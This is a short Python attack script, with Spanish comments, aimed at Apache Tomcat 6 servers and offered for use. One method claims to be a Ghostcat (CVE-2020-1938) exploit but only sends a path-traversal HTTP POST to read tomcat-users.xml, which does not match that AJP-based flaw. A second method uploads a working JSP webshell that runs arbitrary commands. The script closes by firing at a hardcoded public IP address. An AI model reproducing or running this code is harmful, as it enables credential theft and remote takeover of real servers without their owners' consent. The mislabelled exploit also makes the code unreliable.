import requests
import base64

class Tomcat6Exploiter:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        
    def ghostcat_exploit(self):
        """CVE-2020-1938 - Ghostcat exploit para Tomcat 6"""
        try:
            # Intentar leer web.xml via AJP
            payload = {
                'name': '../../../../conf/tomcat-users.xml'
            }
            r = self.session.post(f"{self.target}/examples/jsp/cal/cal2.jsp", data=payload)
            if 'tomcat-users' in r.text:
                return r.text
        except:
            return None
    
    def jsp_upload_webshell(self):
        """Intentar subir webshell JSP"""
        webshell = '''<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while (disr != null) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>'''
        
        # Intentar subir via PUT
        try:
            r = self.session.request('PUT', f"{self.target}/webdav/shell.jsp", data=webshell)
            if r.status_code in [200, 201, 204]:
                return f"{self.target}/webdav/shell.jsp"
        except:
            pass
            
        return None

# Uso del exploit
exploiter = Tomcat6Exploiter("http://189.254.143.102")
exploiter.ghostcat_exploit()